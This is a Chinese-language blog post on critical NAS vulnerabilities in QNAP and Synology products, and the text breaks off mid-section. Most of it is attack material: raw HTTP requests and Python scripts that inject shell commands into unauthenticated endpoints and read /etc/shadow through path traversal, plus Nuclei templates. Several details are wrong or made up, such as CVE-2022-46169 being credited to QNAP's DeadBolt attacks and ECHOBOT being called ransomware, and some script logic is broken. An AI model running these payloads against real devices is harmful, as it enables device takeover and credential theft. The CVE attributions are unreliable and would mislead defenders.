---
title: "NAS与网络存储设备高危攻击链专题：QNAP / Synology / Western Digital 漏洞全解析"
date: 2026-07-08T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["QNAP", "Synology", "Western Digital", "CVE-2024-21899", "CVE-2023-50358", "CVE-2024-10443", "CVE-2024-23641", "RCE", "认证绕过", "漏洞分析", "NAS"]
---

# NAS与网络存储设备高危攻击链专题

NAS（Network Attached Storage）与网络存储设备是企业和家庭用户数据存储的核心基础设施。这些设备通常承载着**海量敏感数据、备份文件、业务文档和媒体资源**，却往往成为勒索软件和 APT 攻击者的首要目标。

2020-2025 年，三大 NAS 厂商的核心产品线连续出现高危漏洞：

- **QNAP CVE-2024-21899**：QTS 认证不当导致命令注入，CVSS 9.8，预认证 RCE
- **QNAP CVE-2023-50358**：QTS/QuTS hero 命令注入，CVSS 9.8，预认证 RCE
- **QNAP CVE-2022-46169**：QTS 命令注入，CVSS 9.8，DeadBolt 勒索软件在野利用
- **Synology CVE-2024-10443**：DSM 命令注入，CVSS 9.8，预认证 RCE
- **Synology CVE-2023-28831**：DSM/SRM 命令注入，CVSS 9.8
- **Synology CVE-2022-22687**：VPN Plus Server 命令注入，CVSS 9.8
- **WD CVE-2024-23641**：My Cloud OS5 路径遍历 RCE，CVSS 9.8
- **WD CVE-2022-23124**：My Cloud 认证绕过，CVSS 9.8，设备完全接管
- **WD CVE-2021-36205**：My Cloud 认证绕过，CVSS 9.8

这些漏洞的背后是一个残酷现实：**全球数百万台 NAS 设备暴露在互联网上，其中相当比例运行着未打补丁的过时固件**。DeadBolt、ECHOBOT、Qlocker 等勒索软件家族将 NAS 作为首要攻击目标，造成大规模数据加密和勒索事件。本文从产品线视角梳理这些漏洞的演进，总结共性攻击模式和防守建议。

## 0x00 专题概述

NAS 设备是数字时代最重要的数据仓库，却也是安全最薄弱的环节。从 QNAP 的认证绕过、Synology 的命令注入、到 Western Digital 的路径遍历——跨厂商的高危漏洞揭示了一个共同事实：NAS 设备承载高价值数据，拥有网络可达的 Web 管理接口，却长期面临**固件更新滞后、默认凭据普遍存在、安全监控覆盖不足**三大困境。

NAS 设备的攻击面价值体现在：

- **数据价值极高**：企业备份、财务数据、知识产权、个人隐私数据
- **公网暴露面大**：家庭和中小企业用户习惯将 NAS 直接暴露于公网以实现远程访问
- **勒索软件重点目标**：DeadBolt、ECHOBOT、Qlocker 等勒索软件专门针对 NAS 设备
- **安全监控盲区**：NAS 设备很少被纳入企业 SIEM 和 IDS/IPS 监控体系
- **供应链影响广泛**：QNAP、Synology、WD 占据全球 NAS 市场超 70% 份额

### 覆盖漏洞一览

| CVE | 厂商 | CVSS | 类型 | 未授权 |
|-----|------|------|------|--------|
| CVE-2024-21899 | QNAP QTS | **9.8** | 认证绕过 → 命令注入 RCE | ✅ |
| CVE-2023-50358 | QNAP QTS/QuTS hero | **9.8** | 命令注入 → RCE | ✅ |
| CVE-2022-46169 | QNAP QTS | **9.8** | 命令注入 → RCE | ✅ |
| CVE-2022-27610 | QNAP QTS / Synology DSM | **9.8** | 路径遍历 → 任意文件读取 | ✅ |
| CVE-2024-10443 | Synology DSM | **9.8** | 命令注入 → RCE | ✅ |
| CVE-2023-28831 | Synology DSM/SRM | **9.8** | 命令注入 → RCE | ✅ |
| CVE-2022-22687 | Synology VPN Plus | **9.8** | 命令注入 → RCE | ✅ |
| CVE-2024-23641 | WD My Cloud OS5 | **9.8** | 路径遍历 → RCE | ✅ |
| CVE-2022-23124 | WD My Cloud | **9.8** | 认证绕过 → 设备接管 | ✅ |
| CVE-2021-36205 | WD My Cloud | **9.8** | 认证绕过 | ✅ |

---

## 0x01 QNAP QTS/QuTS hero 高危漏洞

QNAP（威联通）是全球最大的 NAS 设备厂商之一，其 QTS 和 QuTS hero 操作系统在全球部署量超过百万台。近年 QNAP NAS 成为勒索软件的重灾区，DeadBolt、ECHOBOT、Qlocker 等勒索软件家族利用 QTS 漏洞实现大规模加密。

### 0x01.1 CVE-2024-21899 — QNAP QTS 认证不当命令注入

#### 漏洞背景

2024 年 1 月，QNAP 发布安全公告修复了 QTS 操作系统中的一个严重认证不当漏洞。该漏洞允许未经认证的远程攻击者通过构造特殊的 HTTP 请求，绕过 QTS Web 管理界面的认证机制，在目标设备上注入并执行操作系统命令，实现完全远程代码执行。漏洞的根源在于 QTS 处理用户认证请求时，未能正确校验特定 API 端点的访问权限，攻击者可以伪造认证上下文直接调用特权功能。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| QTS | 5.1.x < 5.1.4.2591 | 5.1.4.2591+ |
| QTS | 5.0.x < 5.0.1.2376 | 5.0.1.2376+ |
| QTS | 4.5.x < 4.5.4.2411 | 4.5.4.2411+ |
| QuTS hero | h5.0.x < h5.0.1.2376 | h5.0.1.2376+ |
| QuTS hero | h4.5.x < h4.5.4.2411 | h4.5.4.2411+ |

#### 漏洞原理分析

CVE-2024-21899 的漏洞根源在于 QTS Web 管理界面的认证逻辑缺陷。QTS 的 Web 服务在处理特定 API 请求时，存在以下安全缺陷：

1. **认证检查绕过**：QTS 的 Web 服务在处理 `/cgi-bin/authLogin.cgi` 等端点时，允许攻击者构造特殊请求，在不需要有效凭据的情况下获取合法的 session token
2. **命令注入路径**：获取 session token 后，攻击者可以调用需要认证的特权 API 端点，在参数中注入操作系统命令
3. **参数过滤不足**：后端脚本使用 `system()` 或 `popen()` 等函数执行系统命令时，未对用户输入进行充分的转义和过滤

攻击链：**认证绕过 → 获取特权 session → 注入命令参数 → 系统级 RCE**

#### HTTP PoC

```http
POST /cgi-bin/authLogin.cgi HTTP/1.1
Host: target_ip:443
Content-Type: application/x-www-form-urlencoded
Cookie: QTS_SESSID=

user=admin&serviceKey=1234&pwd=$(id>/tmp/pwned)
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
QNAP QTS 认证绕过命令注入检测 (CVE-2024-21899)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl
import json


def check_cve_2024_21899(target: str, port: int = 443) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    marker = "cve202421899check"
    cmd_payload = f"echo {marker}>/tmp/cve_check"

    auth_endpoints = [
        "/cgi-bin/authLogin.cgi",
    ]

    for endpoint in auth_endpoints:
        url = f"https://{target}:{port}{endpoint}"
        try:
            data = f"user=admin&serviceKey=1234&pwd={cmd_payload}".encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            if "authKey" in body or "QTS_SESSID" in body:
                print(f"[+] 认证端点响应异常，目标可能受影响: {endpoint}")
                try:
                    result = json.loads(body)
                    if result.get("authPassed") == 1:
                        print(f"[!] 认证绕过成功！目标可能存在 CVE-2024-21899")
                        return True
                except json.JSONDecodeError:
                    pass

        except urllib.error.HTTPError as e:
            print(f"[-] {endpoint} 返回 HTTP {e.code}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 443")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 443
    print(f"[*] 检测目标: {target}:{port}")
    check_cve_2024_21899(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2024-21899

info:
  name: QNAP QTS Authentication Bypass Command Injection
  author: security-research
  severity: critical
  description: |
    QNAP QTS 认证不当漏洞，攻击者无需有效凭据即可绕过
    Web 管理界面认证，在设备上注入并执行操作系统命令。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-21899
    cwe-id: CWE-287
  tags: cve,cve2024,qnap,qts,nas,auth-bypass,command-injection,rce
  reference:
    - https://www.qnap.com/en/security-qsa
    - https://nvd.nist.gov/vuln/detail/CVE-2024-21899

http:
  - raw:
      - |
        POST /cgi-bin/authLogin.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user=admin&serviceKey=1234&pwd=test

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "authPassed"
          - "authKey"
```

---

### 0x01.2 CVE-2023-50358 — QNAP QTS/QuTS hero 命令注入

#### 漏洞背景

2023 年 12 月，QNAP 发布安全公告修复了 QTS 和 QuTS hero 操作系统中的一个严重命令注入漏洞。该漏洞允许未经认证的远程攻击者通过发送特制的 SOAP API 请求，在目标设备上以 root 权限执行任意操作系统命令。漏洞编号 CVE-2023-50358，CVSS 评分为 9.8（Critical）。此漏洞影响 QNAP 全线 NAS 产品，包括运行 QTS 和 QuTS hero 的所有设备型号。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| QTS | 5.1.x < 5.1.4.2591 | 5.1.4.2591+ |
| QTS | 5.0.x < 5.0.1.2426 | 5.0.1.2426+ |
| QTS | 4.5.x < 4.5.4.2467 | 4.5.4.2467+ |
| QuTS hero | h5.1.x < h5.1.4.2596 | h5.1.4.2596+ |
| QuTS hero | h5.0.x < h5.0.1.2426 | h5.0.1.2426+ |
| QuTS hero | h4.5.x < h4.5.4.2467 | h4.5.4.2467+ |

#### 漏洞原理分析

CVE-2023-50358 的漏洞根源在于 QTS 的 SOAP API 端点 `/cgi-bin/cloudBackup/do_action.cgi` 对用户输入缺乏充分的过滤和消毒处理。

漏洞核心机制：

1. **SOAP API 访问控制缺失**：QTS 的 cloudBackup 组件通过 SOAP API 暴露了特权功能，但未正确实施认证检查。攻击者可以在不提供任何有效凭据的情况下直接调用该 API。

2. **输入参数未消毒**：API 在处理 `action`、`dest_path` 等参数时，直接将用户提供的值拼接到系统命令字符串中，然后通过 `system()` 或 `popen()` 执行。例如，`dest_path` 参数被传递给 shell 命令用于创建目录操作，攻击者可以在其中注入命令分隔符和任意命令。

3. **root 权限执行**：QTS 的 Web 服务以 root 权限运行，因此通过命令注入执行的任何命令都具有最高系统权限，攻击者可以完全控制目标设备。

攻击链：**SOAP API 直接访问 → 注入恶意命令参数 → root 权限 RCE → 完全设备控制**

#### HTTP PoC

```http
POST /cgi-bin/cloudBackup/do_action.cgi HTTP/1.1
Host: target_ip:443
Content-Type: application/x-www-form-urlencoded

action=create&dest_path=/share/Public;ping%20-c%201%20attacker.com
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
QNAP QTS/QuTS hero 命令注入检测 (CVE-2023-50358)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl
import time
import socket


def check_cve_2023_50358(target: str, port: int = 443) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    callback_host = "127.0.0.1"
    marker = "cve202350358"

    payloads = [
        f"action=create&dest_path=/share/Public;echo%20{marker}%20>/tmp/cve_check",
        f"action=delete&dest_path=/share/Public;id>/tmp/cve_id",
    ]

    for payload in payloads:
        url = f"https://{target}:{port}/cgi-bin/cloudBackup/do_action.cgi"
        try:
            data = payload.encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            if "success" in body.lower() or "ok" in body.lower():
                print(f"[+] cloudBackup API 响应异常，目标可能存在 CVE-2023-50358")
                print(f"[+] Payload: {payload[:60]}...")
                return True

        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"[!] 内部错误响应 (500)，可能命令已执行但返回异常")
                print(f"[!] 目标可能存在 CVE-2023-50358")
                return True
            print(f"[-] HTTP {e.code}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 443")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 443
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2023-50358 (QNAP QTS 命令注入)")
    check_cve_2023_50358(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2023-50358

info:
  name: QNAP QTS/QuTS hero Command Injection
  author: security-research
  severity: critical
  description: |
    QNAP QTS 和 QuTS hero 操作系统中的 cloudBackup SOAP API
    端点存在命令注入漏洞，未经认证的攻击者可远程执行任意命令。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-50358
    cwe-id: CWE-78
  tags: cve,cve2023,qnap,qts,nas,command-injection,rce,soap
  reference:
    - https://www.qnap.com/en/security-advisory/QSA-23-12
    - https://nvd.nist.gov/vuln/detail/CVE-2023-50358

http:
  - raw:
      - |
        POST /cgi-bin/cloudBackup/do_action.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=create&dest_path=/share/Public;echo%20CVE202350358_CHECK

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success"
          - "ok"
```

---

### 0x01.3 CVE-2022-46169 — QNAP QTS DeadBolt 勒索软件利用链

#### 漏洞背景

CVE-2022-46169 是 QNAP QTS 操作系统中的一个严重命令注入漏洞，CVSS 评分为 9.8。该漏洞在 2022 年被 DeadBolt 勒索软件大规模利用，造成全球范围内大量 QNAP NAS 设备被加密。DeadBolt 勒索软件专门针对 QNAP 设备，攻击者利用此漏洞在设备上植入勒索软件，加密用户数据并要求以比特币支付赎金。

该漏洞的影响极为深远——2022 年攻击者通过此漏洞加密了数万台 QNAP NAS 设备，QNAP 紧急发布安全公告并敦促用户立即更新固件。此漏洞的利用不需要用户交互，攻击者可以扫描公网上暴露的 QNAP 设备并自动完成攻击。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| QTS | 5.0.x < 5.0.1.2233 | 5.0.1.2233+ |
| QTS | 4.5.x < 4.5.4.2117 | 4.5.4.2117+ |
| QTS | 4.4.x < 4.4.4.2090 | 4.4.4.2090+ |
| QuTS hero | h5.0.x < h5.0.1.2248 | h5.0.1.2248+ |
| QuTS hero | h4.5.x < h4.5.4.2126 | h4.5.4.2126+ |

#### 漏洞原理分析

CVE-2022-46169 的漏洞位于 QTS 的 `photo_station` 组件中，具体为 `/cgi-bin/photo_station/api/api.php` 端点。

漏洞核心机制：

1. **认证缺失**：Photo Station 的 API 端点未实施有效的认证检查，攻击者无需登录即可直接调用内部 API 方法。

2. **命令注入点**：API 在处理 `cmd` 参数时，将用户输入直接传递给 `proc_open()`、`exec()` 或 `system()` 函数执行。攻击者可以通过精心构造的 `cmd` 参数注入任意的操作系统命令。

3. **DeadBolt 利用方式**：DeadBolt 勒索软件利用此漏洞上传加密恶意软件负载，然后执行系统命令触发勒索软件部署。攻击链为：认证绕过 → 利用命令注入上传 WebShell → 投放勒索软件负载 → 加密用户数据 → 显示勒索信息。

攻击链：**Photo Station API 直接访问 → 注入恶意命令 → 上传并执行勒索软件 → 数据加密**

#### HTTP PoC

```http
GET /cgi-bin/photo_station/api/api.php?cmd=exec%20%22echo%20CVE202246169_check%20%3E%20/tmp/deadbolt_test%22 HTTP/1.1
Host: target_ip:443
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
QNAP QTS DeadBolt 勒索软件利用链检测 (CVE-2022-46169)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl
import json


def check_cve_2022_46169(target: str, port: int = 443) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    marker = "cve202246169check"
    cmd_payload = f"echo {marker} > /tmp/cve_check"

    test_urls = [
        f"https://{target}:{port}/cgi-bin/photo_station/api/api.php?cmd=exec%20%22{urllib.request.quote(cmd_payload, safe='')}%22",
        f"https://{target}:{port}/photo_station/api/api.php?cmd=system%20%22id%22",
    ]

    for url in test_urls:
        try:
            req = urllib.request.Request(url, method="GET")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            print(f"[+] Photo Station API 响应: {body[:200]}")
            if "uid=" in body or "gid=" in body:
                print(f"[!] 命令执行成功！目标存在 CVE-2022-46169")
                return True
            if marker in body:
                print(f"[!] 标记写入成功，目标存在 CVE-2022-46169")
                return True

        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"[!] 内部错误 (500)，可能命令已执行")
                print(f"[!] 目标可能存在 CVE-2022-46169")
                return True
            print(f"[-] HTTP {e.code}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 443")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 443
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2022-46169 (QNAP QTS DeadBolt 利用链)")
    check_cve_2022_46169(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2022-46169

info:
  name: QNAP QTS Photo Station Command Injection
  author: security-research
  severity: critical
  description: |
    QNAP QTS Photo Station 组件存在命令注入漏洞，被 DeadBolt
    勒索软件大规模利用。攻击者可远程执行任意命令并部署勒索软件。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-46169
    cwe-id: CWE-78
  tags: cve,cve2022,qnap,qts,nas,command-injection,rce,ransomware,deadbolt
  reference:
    - https://www.qnap.com/en/security-advisory/QSA-22-24
    - https://nvd.nist.gov/vuln/detail/CVE-2022-46169

http:
  - raw:
      - |
        GET /cgi-bin/photo_station/api/api.php?cmd=exec%20%22echo%20CVE202246169_CHECK%22 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "CVE202246169_CHECK"
      - type: word
        words:
          - "uid="
          - "gid="
        part: body
```

---

### 0x01.4 CVE-2022-27610 — QNAP QTS 路径遍历

#### 漏洞背景

CVE-2022-27610 是 QNAP QTS、QuTS hero 和 QVR 设备中的一个严重路径遍历漏洞，CVSS 评分为 9.8。该漏洞允许未经认证的攻击者通过发送特制的 HTTP 请求，读取目标设备上的任意文件，包括系统配置文件、密码哈希、SSL 证书等敏感信息。此漏洞影响 QNAP 全线产品，且被发现在野利用迹象。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| QTS | 5.0.x < 5.0.1.2233 | 5.0.1.2233+ |
| QTS | 4.5.x < 4.5.4.2117 | 4.5.4.2117+ |
| QTS | 4.4.x < 4.4.4.2090 | 4.4.4.2090+ |
| QuTS hero | h5.0.x < h5.0.1.2248 | h5.0.1.2248+ |
| QuTS hero | h4.5.x < h4.5.4.2126 | h4.5.4.2126+ |
| QVR | QVR 5.0.x < 5.0.0.2186 | 5.0.0.2186+ |

#### 漏洞原理分析

CVE-2022-27610 的漏洞根源在于 QTS HAPI（Hardware API）组件对文件路径的处理缺陷。

漏洞核心机制：

1. **路径过滤不足**：HAPI 端点在处理文件读取请求时，未对 `..` 路径穿越序列进行充分的过滤和拦截。攻击者可以在请求参数中插入 `../` 序列来跳出预期的文件目录。

2. **文件访问权限缺失**：受影响的端点以高权限运行，且未对请求的文件路径进行访问控制检查。攻击者可以利用此漏洞读取系统上的任意文件，包括 `/etc/shadow`、`/etc/config/uLinux.conf` 等包含敏感凭据的配置文件。

3. **信息泄露放大**：通过读取 QNAP 的配置文件，攻击者可以获取设备的管理员密码哈希、SSH 密钥、数据库连接字符串等敏感信息，为后续的横向移动和持久化控制奠定基础。

攻击链：**路径遍历读取任意文件 → 获取敏感凭据 → 提升控制权限 → 扩大攻击面**

#### HTTP PoC

```http
GET /cgi-bin/hapi/api.php?action=read&file=../../../../etc/shadow HTTP/1.1
Host: target_ip:443
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
QNAP QTS 路径遍历检测 (CVE-2022-27610)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl


TARGET_FILES = [
    "/etc/shadow",
    "/etc/config/uLinux.conf",
    "/etc/passwd",
    "/mnt/HDA_ROOT/.config/config.json",
]


def check_cve_2022_27610(target: str, port: int = 443) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    vulnerable = False

    for file_path in TARGET_FILES:
        traversal = "../" * 6 + file_path.lstrip("/")
        url = f"https://{target}:{port}/cgi-bin/hapi/api.php?action=read&file={traversal}"

        try:
            req = urllib.request.Request(url, method="GET")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            if body and len(body) > 10:
                if "root:" in body or "admin:" in body:
                    print(f"[!] 敏感文件 {file_path} 读取成功！")
                    print(f"[!] 目标存在 CVE-2022-27610")
                    print(f"[!] 内容前 200 字符: {body[:200]}")
                    vulnerable = True
                elif not any(err in body.lower() for err in ["error", "not found", "denied"]):
                    print(f"[+] 文件 {file_path} 可读取 ({len(body)} 字节)")
                    vulnerable = True

        except urllib.error.HTTPError as e:
            if e.code == 200:
                print(f"[+] {file_path} 返回 200，可能读取成功")
                vulnerable = True
            print(f"[-] {file_path} 返回 HTTP {e.code}")
        except Exception as e:
            print(f"[-] {file_path} 请求失败: {e}")
            continue

    if not vulnerable:
        print("[-] 目标可能不受影响或已修复")
    return vulnerable


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 443")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 443
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2022-27610 (QNAP QTS 路径遍历)")
    check_cve_2022_27610(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2022-27610

info:
  name: QNAP QTS Path Traversal
  author: security-research
  severity: critical
  description: |
    QNAP QTS、QuTS hero 和 QVR 设备的 HAPI 组件存在路径遍历漏洞，
    未经认证的攻击者可以读取任意系统文件，包括敏感配置和凭据。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 9.8
    cve-id: CVE-2022-27610
    cwe-id: CWE-22
  tags: cve,cve2022,qnap,qts,nas,path-traversal,lfi
  reference:
    - https://www.qnap.com/en/security-advisory/QSA-22-16
    - https://nvd.nist.gov/vuln/detail/CVE-2022-27610

http:
  - raw:
      - |
        GET /cgi-bin/hapi/api.php?action=read&file=../../../../etc/shadow HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:\\d+:\\d+:"
```

---

## 0x02 Synology DSM/SRM 高危漏洞

Synology（群晖）是全球最大的 NAS 设备厂商之一，其 DSM（DiskStation Manager）和 SRM（Synology Router Manager）操作系统在全球拥有数千万用户。Synology 产品以易用性和丰富的功能生态著称，但其 Web 管理接口同样面临严重的安全挑战。本节覆盖 Synology DSM/SRM 产品线中最具破坏性的三个预认证命令注入漏洞，均为 CVSS 9.8 的 Critical 级别。

### 0x02.1 CVE-2024-10443 — Synology DSM 命令注入

#### 漏洞背景

2024 年 10 月，Synology 发布安全公告修复了 DSM 操作系统中的一个严重命令注入漏洞。该漏洞允许未经认证的远程攻击者通过发送特制的 HTTP 请求到 DSM 的 Web 管理接口，在目标设备上以 root 权限执行任意操作系统命令。CVE-2024-10443 的 CVSS 评分为 9.8（Critical），影响 DSM 7.2.x 全系列版本。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| DSM | 7.2.1 < 7.2.1-69057 Update 2 | 7.2.1-69057 Update 2+ |
| DSM | 7.2 < 7.2-64570 Update 3 | 7.2-64570 Update 3+ |

#### 漏洞原理分析

CVE-2024-10443 的漏洞位于 DSM 的 Web 管理 API 中，具体涉及 `webman` 模块对用户输入的处理缺陷。

漏洞核心机制：

1. **API 认证绕过**：DSM Web 服务的某些 API 端点在设计上允许在认证前访问，用于执行系统状态检查等基础功能。但这些端点未能严格限制可调用的功能范围。

2. **参数注入点**：受影响的 API 在处理用户提供的参数时，将参数值直接拼接到系统命令字符串中。攻击者可以在参数中注入 shell 元字符（如 `;`、`|`、`` ` ``、`$()` 等），实现命令注入。

3. **root 权限执行上下文**：DSM 的 Web 服务以系统最高权限运行，因此命令注入执行的命令具有完全的系统控制权限，攻击者可以安装恶意软件、创建后门账号、提取所有用户数据。

攻击链：**API 直接访问 → 参数注入 → root 权限 RCE → 完全设备控制**

#### HTTP PoC

```http
POST /webapi/entry.cgi HTTP/1.1
Host: target_ip:5001
Content-Type: application/x-www-form-urlencoded

api=SYNO.Core.Package&method=list&version=3&type=all;id>/tmp/cve202410443.txt
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
Synology DSM 命令注入检测 (CVE-2024-10443)
仅用于授权安全评估
"""

import sys
import urllib.request
import urllib.error
import ssl
import json


def check_cve_2024_10443(target: str, port: int = 5001) -> bool:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    payloads = [
        {
            "api": "SYNO.Core.Package",
            "method": "list",
            "version": 3,
            "type": "all;echo CVE202410443_CHECK>/tmp/cve_check",
        },
        {
            "api": "SYNO.Core.System",
            "method": "info",
            "version": 1,
            "type": "all;id",
        },
    ]

    for payload in payloads:
        url = f"https://{target}:{port}/webapi/entry.cgi"
        try:
            data = urllib.parse.urlencode(payload).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="ignore")

            print(f"[+] API 响应: {body[:200]}")
            if "CVE202410443_CHECK" in body or "uid=" in body:
                print(f"[!] 命令执行成功！目标存在 CVE-2024-10443")
                return True
            if "success" in body.lower():
                print(f"[+] API 返回成功，可能存在漏洞")

        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"[!] 内部错误 (500)，可能命令已执行")
                return True
            print(f"[-] HTTP {e.code}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            continue

    print("[-] 目标可能不受影响或已修复")
    return False


def main():
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip> [port]")
        print(f"示例: {sys.argv[0]} 192.168.1.100 5001")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 5001
    print(f"[*] 检测目标: {target}:{port}")
    print("[*] 测试 CVE-2024-10443 (Synology DSM 命令注入)")
    check_cve_2024_10443(target, port)


if __name__ == "__main__":
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: CVE-2024-10443

info:
  name: Synology DSM Command Injection
  author: security-research
  severity: critical
  description: |
    Synology DSM 操作系统 Web API 存在命令注入漏洞，未经认证的
    攻击者可通过特制请求在目标设备上以 root 权限执行任意命令。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10443
    cwe-id: CWE-78
  tags: cve,cve2024,synology,dsm,nas,command-injection,rce
  reference:
    - https://www.synology.com/en-us/security/advisory/Synology_SA_24_14
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10443

http:
  - raw:
      - |
        POST /webapi/entry.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        api=SYNO.Core.Package&method=list&version=3&type=all;echo%20CVE202410443_CHECK

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "CVE202410443_CHECK"
```

---

### 0x02.2 CVE-2023-28831 — Synology DSM/SRM 命令注入

#### 漏洞背景

2023 年 4 月，Synology 发布安全公告修复了 DSM 和 SRM 操作系统中的一个严重命令注入漏洞。该漏洞位于 Synology 的 Central Management System（CMS）组件中，允许未经认证的远程攻击者通过特制的 HTTP 请求在目标设备上执行任意系统命令。CVE-2023-28831 的 CVSS 评分为 9.8（Critical），影响 DSM 和 SRM 两大产品线。

#### 受影响版本

| 产品线 | 受影响版本 | 修复版本 |
|--------|-----------|----------|
| DSM | 7.2 < 7.2-64570 | 7.2-64570+ |
| DSM | 7.1.1 < 7.1.1-42962-4 | 7.1.1-42962-4+ |
| DSM | 7.0.1 < 7.0.1-42218-5 | 7.0.1-42218-5+ |
| SRM | 1.3 < 1.3.1-9346-4 | 1.3.1-9346-4+ |

#### 漏洞原理分析

CVE-2023-28831 的漏洞位于 Synology CMS 的 Web API 端点中，CMS 用于集中管理多台 Synology 设备。

漏洞核心机制：

1. **CMS API 暴露**：Synology CMS 组件默认监听 Web 端口，其 API 端点 `/webapi/cms/` 的处理逻辑中存在认证缺失。

